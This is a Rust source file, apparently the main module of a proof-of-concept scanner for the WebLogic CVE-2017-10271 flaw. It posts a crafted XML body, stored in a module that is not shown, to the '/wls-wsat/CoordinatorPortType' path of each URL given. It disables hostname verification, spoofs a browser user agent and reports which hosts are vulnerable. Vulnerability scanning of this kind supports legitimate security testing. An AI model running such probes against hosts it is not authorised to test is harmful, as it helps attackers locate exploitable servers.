#[macro_use]
extern crate lazy_static;
extern crate reqwest;
extern crate termcolor;

use reqwest::header;
use reqwest::Client;
use std::env;
use std::error::Error;
use std::result::Result;
use std::time::Duration;
use termcolor::{Color, ColorSpec};

mod constant;
mod term;

fn main() {
    welcome();
    run();
}

fn run() {
    let term = term::TERM.clone();
    let mut vulner_spec = ColorSpec::new();
    let mut not_vulner_spec = ColorSpec::new();
    let mut err_spec = ColorSpec::new();
    vulner_spec.set_fg(Some(Color::Red)).set_bold(true);
    not_vulner_spec.set_fg(Some(Color::Green)).set_bold(true);
    err_spec.set_bg(Some(Color::Magenta));
    let mut nargs = 0;
    term.set_default_color(Some(Some(Color::Blue)), None, Some(true));
    for url in env::args() {
        nargs += 1;
        if nargs == 1 {
            continue;
        }
        term.out(&url);
        term.out(": ");
        let url = format!("{}/wls-wsat/CoordinatorPortType", url);
        match test_site(&url) {
            Ok(true) => term.cout("Vulnerable\n", &vulner_spec),
            Ok(false) => term.cout("Not Vulnerable\n", &not_vulner_spec),
            Err(e) => term.cout(format!("{}\n", e), &err_spec),
        };
    }
    term.set_default_color(Some(None), Some(None), Some(false));
    if nargs <= 1 {
        let mut spec = ColorSpec::new();
        spec.set_fg(Some(Color::Blue)).set_bold(true);
        term.cout("USAGE: ", &spec);
        term.out(constant::USAGE);
        term.cout("\n\nEXAMPLE:", &spec);
        term.out(constant::EXAMPLE);
    } else {
        term.out("\nThank you for donation: ");
        cout_donate();
        term.out("\n")
    }
}

fn test_site(url: &String) -> Result<bool, Box<Error>> {
    let mut response = Client::builder()
        .danger_disable_hostname_verification()
        .timeout(Some(Duration::from_secs(10)))
        .build()?
        .post(url)
        .header(header::UserAgent::new(
            "Mozilla/5.0 (X11; Fedora; Linux mips64; rv:59.0) Gecko/20100101 Firefox/59.0",
        ))
        .header(header::ContentType::xml())
        .body(constant::BODY)
        .send()?;
    let response = if !response.status().is_success() {
        return Ok(false);
    } else {
        response.text()?
    };
    if response.starts_with(constant::VULNER_TEXT) {
        Ok(true)
    } else {
        Ok(false)
    }
}

fn welcome() {
    let term = term::TERM.clone();
    term.set_default_color(None, None, Some(true));
    term.out(
        "Thank you to use CVE-2017-10271 POC!\nTo help author, Donate ",
    );
    cout_donate();
    term.set_default_color(None, None, Some(false));
    term.out("\n\n");
}

fn cout_donate() {
    let term = term::TERM.clone();
    let mut spec = ColorSpec::new();
    spec.set_fg(Some(Color::Red))
        .set_bg(Some(Color::Yellow))
        .set_bold(true);
    term.cout(constant::DONATE, &spec);
}
